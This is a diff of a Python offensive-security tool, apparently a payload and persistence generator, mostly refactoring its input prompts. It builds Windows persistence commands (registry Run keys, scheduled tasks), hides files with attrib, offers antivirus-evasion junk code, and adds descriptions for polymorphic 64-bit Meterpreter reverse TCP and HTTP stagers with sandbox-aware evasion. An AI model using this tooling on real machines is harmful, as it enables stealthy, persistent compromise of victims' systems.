-            Procname=raw_input("\n[>] Insert the name of the process to keep-alive: ") 
-            FpathOrFname=raw_input("\n[>] Insert fullpath to the file to execute if process died: ")
-            CheckTime=raw_input("\n[>] Insert time interval to check if process died (in seconds): ")
-            EvasionJunkcode = YesOrNo(raw_input("\n[>] Add antivirus evasion code and junkcode? (y/n):"))
-            Procnumb=require_multiproc()
-            CheckTime += "000"
+    if "Startup" in module_type:
+
+        FpathOrFname=InputFunc("\n[>] Insert file path to add to startup: ")
+        FakeAppName=InputFunc("\n[>] Insert fake app name: ")
+        Elevated = InputFunc("\n[>] Require admin privilege? (y/n):")
+        EvasionJunkcode = InputFunc("\n[>] Add antivirus evasion code and junkcode? (y/n):")
+        OutputResult = YesOrNo(InputFunc("\n[>] Add result output code? (prints completed or failed) (y/n):"))
+        Procnumb=require_multiproc()
+
+    elif "TimeBased" in module_type:
+
+        Procname=InputFunc("\n[>] Insert the name of the process to keep-alive: ") 
+        FpathOrFname=InputFunc("\n[>] Insert fullpath to the file to execute if process died: ")
+        CheckTime=InputFunc("\n[>] Insert time interval to check if process died (in seconds): ")
+        EvasionJunkcode = YesOrNo(InputFunc("\n[>] Add antivirus evasion code and junkcode? (y/n):"))
+        Procnumb=require_multiproc()
+
+        CheckTime += "000"
 
 
-        CompileFor=raw_input("\n[>] Insert compiler option (x86 or x64): ")
-        OutFile=raw_input("\n[>] Insert output filename: ")
+    CompileFor=InputFunc("\n[>] Insert compiler option (x86 or x64): ")
+    OutFile=InputFunc("\n[>] Insert output filename: ")
     sleep(0.5)
+
     print(bcolors.GREEN + "\n[>] Generating Persistence C Agent...\n" + bcolors.ENDC)
 
 
@@ -1649,17 +1886,14 @@ def Windows_C_PersistenceAgent(module_type):        #At Startup
 
 def Windows_CMD_PersistenceAgent():        #At Startup
     clear()
-    py_version=platform.python_version()
-    if py_version[0] == "3":
-        FullPath = input("\n[>] Insert file path to add to startup: ")
-        RegValue = input("\n[>] Insert registry filename (Enter for random generation): ")
-        Elevated = YesOrNo(input("\n[>] Require admin privilege? (y/n):"))
-    else:
-        FullPath = raw_input("\n[>] Insert file path to add to startup: ")
-        RegValue = raw_input("\n[>] Insert registry filename (Enter for random generation): ")
-        Elevated = YesOrNo(raw_input("\n[>] Require admin privilege? (y/n):"))
+
+    FullPath = InputFunc("\n[>] Insert file path to add to startup: ")
+    RegValue = InputFunc("\n[>] Insert registry filename (Enter for random generation): ")
+    Elevated = YesOrNo(InputFunc("\n[>] Require admin privilege? (y/n):"))
+
 
     if RegValue == "":
+
         RegValue = RandString()
 
     if Elevated == "True":
@@ -1667,6 +1901,7 @@ def Windows_CMD_PersistenceAgent():        #At Startup
         Req = bcolors.RED + "Required" + bcolors.ENDC
 
         AddPersistenceCmd = "reg add \"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" /V \"" + RegValue + "\" /t REG_SZ /F /D \"" + FullPath + "\""
+
         RemovePersistenceCmd = "reg delete \"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" /V \"" + RegValue + "\" /f"
 
     else:
@@ -1674,8 +1909,9 @@ def Windows_CMD_PersistenceAgent():        #At Startup
         Req = bcolors.GREEN + "Not Required"  + bcolors.ENDC
 
         AddPersistenceCmd = "reg add \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" /V \"" + RegValue + "\" /t REG_SZ /F /D \"" + FullPath + "\""
+
         RemovePersistenceCmd = "reg delete \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" /V \"" + RegValue + "\" /f" 
-    sleep(0.5)
+    sleep(0.2)
     print(bcolors.GREEN + "\n[>] Generating cmdline...\n" + bcolors.ENDC)
     sleep(1)
 
@@ -1693,16 +1929,11 @@ def Windows_Schtasks_Persistence():
     print("[1] At Startup     (start on user login)")
     print("[2] Daily time     (start once at day)")
     print("[3] User Idle time (start if user is idle for x time)")
-    if py_version[0] == "3":
 
-        PersistenceType = input("\n[>] Insert schtasks mode : ")
-        FullPath = input("\n[>] Insert fullpath to file or script to schedule: ")
-        Taskname = input("\n[>] Insert taskname (Enter for random generation): ")
-    else:
 
-        PersistenceType = raw_input("\n[>] Insert schtasks mode : ")
-        FullPath = raw_input("\n[>] Insert fullpath to file or script to schedule: ")
-        Taskname = raw_input("\n[>] Insert taskname (Enter for random generation): ")
+    PersistenceType = InputFunc("\n[>] Insert schtasks mode : ")
+    FullPath = InputFunc("\n[>] Insert fullpath to file or script to schedule: ")
+    Taskname = InputFunc("\n[>] Insert taskname (Enter for random generation): ")
 
     if Taskname == "":
         Taskname = ""
@@ -1710,62 +1941,56 @@ def Windows_Schtasks_Persistence():
 
 
     if PersistenceType == "1":
-        if py_version[0] == "3":
-            UseDelay = YesOrNo(input("\n[>] Insert execution delay after userlogin? (y/n): "))
-        else:
-            UseDelay = YesOrNo(raw_input("\n[>] Insert execution delay after userlogin? (y/n): "))
+
+        UseDelay = YesOrNo(InputFunc("\n[>] Insert execution delay after userlogin? (y/n): "))
 
         if UseDelay == "True":
+
             print("\n[Help] hhmm:ss format")
             print("\n[Example] a minute and half of delay = 0001:30")
-            if py_version[0] == "3":
-                TimeVar = input("\n[>] Insert delay value: ")
-            else:
-                TimeVar = raw_input("\n[>] Insert delay value: ")
+
+            TimeVar = InputFunc("\n[>] Insert delay value: ")
+
             sleep(0.01)
+
             while len(TimeVar) < 7:
+
                 print(bcolors.RED + "\n [-] Invalid time format" + bcolors.ENDC)
                 print("\n[Help] hhmm:ss format")
                 print("\n[Example] a minute and half of delay = 0001:30")
-                if py_version[0] == "3":
-                    TimeVar = input("\n[>] Insert delay value: ")  
-                else:
-                    TimeVar = raw_input("\n[>] Insert delay value: ")
+                TimeVar = InputFunc("\n[>] Insert delay value: ")
         else:
             TimeVar = "No"        
 
-    elif PersistenceType == "2":   
+    elif PersistenceType == "2":
+   
         print("\n [Help] hhmm:ss format,")
         print("\n [Example] schedule for half past midnight = 0030:00")
-        if py_version[0] == "3":
-            TimeVar = input("\n[>] Insert daytime for scheduled execution: ") 
-        else:
-            TimeVar = raw_input("\n[>] Insert daytime for scheduled execution: ")
+
+        TimeVar = InputFunc("\n[>] Insert daytime for scheduled execution: ")
 
         while len(TimeVar) < 7:
+
             print(bcolors.RED + "\n [-] Invalid time format" + bcolors.ENDC)
             print("\n [Help] hhmm:ss format,")
             print("\n [Example] schedule for half past midnight = 0030:00")
-            if py_version[0] == "3":
-                TimeVar = input("\n[>] Insert daytime for scheduled execution : ")  
-            else:
-                TimeVar = raw_input("\n[>] Insert daytime for scheduled execution: ")                      
+            TimeVar = InputFunc("\n[>] Insert daytime for scheduled execution: ")                      
                
-    elif PersistenceType == "3":   
+    elif PersistenceType == "3":
+   
         print("\n [Help] hhmm:ss Timeformat,")
-        print("\n [Example:] execute after user has been idle a minute and half = 0001:30") 
-        if py_version[0] == "3":
-            TimeVar = input("\n [>] Insert idletime value: ") 
-        else:
-            TimeVar = raw_input("\n [>] Insert idletime value: ") 
+        print("\n [Example:] execute after user has been idle a minute and half = 0001:30")
+ 
+        TimeVar = InputFunc("\n [>] Insert idletime value: ")
+ 
         while len(TimeVar) < 7:
+
             print(bcolors.RED + "\n [-] Invalid time format" + bcolors.ENDC)
             print("\n [Help] hhmm:ss Timeformat,")
             print("\n [Example] execute after user has been idle a minute and half = 0001:30")
-            if py_version[0] == "3":
-                TimeVar = input("\n[>] Insert idletime value: ")  
-            else:
-                TimeVar = raw_input("\n[>] Insert idletime value: ")  
+
+            TimeVar = InputFunc("\n[>] Insert idletime value: ")
+  
     sleep(0.2)
     print(bcolors.GREEN + "\n[>] Generating Persistence Cmdline...\n" + bcolors.ENDC)
     sleep(1)
@@ -1783,12 +2008,8 @@ def Windows_Schtasks_Persistence():
 
 def Attrib_CMD():
     clear()
-    py_version=platform.python_version()
-    if py_version[0] == "3":
 
-        Fullpath=input("\n[>] Insert fullpath to file: ")
-    else:
-        Fullpath=raw_input("\n[>] Insert fullpath to file: ")
+    Fullpath=InputFunc("\n[>] Insert fullpath to file: ")
 
     cmdline="attrib +h " + Fullpath
     clear()
@@ -1798,14 +2019,9 @@ def Attrib_CMD():
 
 def Windows_C_HiddenFiles():
     clear()
-    py_version=platform.python_version()
-    if py_version[0] == "3":
 
-        CompileFor=input("\n[>] Insert compiler option (x86 or x64): ")
-        OutFile=input("\n[>] Insert output filename: ")
-    else:
-        CompileFor=raw_input("\n[>] Insert compiler option (x86 or x64): ")
-        OutFile=raw_input("\n[>] Insert output filename: ")
+    CompileFor=InputFunc("\n[>] Insert compiler option (x86 or x64): ")
+    OutFile=InputFunc("\n[>] Insert output filename: ")
 
     sleep(0.5)
     print(bcolors.GREEN + "\n[>] Generating C code...\n" + bcolors.ENDC)
@@ -1835,12 +2051,8 @@ def SelectHideMode():
     print("[1] Cmdline                                 (attrib)")
     print("[2] Compiled Executable      (SetFilesAttribute API)")
     print("[0] Main Menu\n")
-    if py_version[0] == "3":
 
-        Mode = input("\n[>] Select mode : ")
-    else:
-
-        Mode = raw_input("\n[>] Select mode : ")
+    Mode = InputFunc("\n[>] Select mode : ")
 
     if Mode == "1":
 
@@ -2157,7 +2369,36 @@ def description_printer(module_type):
         description += "  Sandbox-aware code \n"
         description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
 
-        # POST-EXPLOITATION
+    elif module_type == "Polymorphic_C_x64ReverseTcpMeterpreter_windows.py":
+
+        description = ""
+        description += "  This Module generate and compile\n"
+        description += "  64bit pure c meterpreter reverse tcp stagers. \n"
+        description += "  Require msfconsole multi/handler listener\n"
+        description += "  with payload set to windows/meterpreter/reverse_tcp\n\n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  Polymorphic source code \n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+
+    elif module_type == "Polymorphic_C_x64ReverseHttpMeterpreter_windows.py":
+
+        description = ""
+        description += "  This Module generate and compile\n"
+        description += "  64bit pure c meterpreter reverse http stagers. \n"
+        description += "  Require msfconsole multi/handler listener\n"
+        description += "  with payload set to windows/meterpreter/reverse_http\n\n"
+        description += "  [>] STATIC EVASION:\n"
+        description += "  Polymorphic source code \n"
+        description += "  [>] DYNAMIC EVASION:\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+    # POST-EXPLOITATION
 
     elif module_type == "Windows_C_Persistence_Startup.py":
 
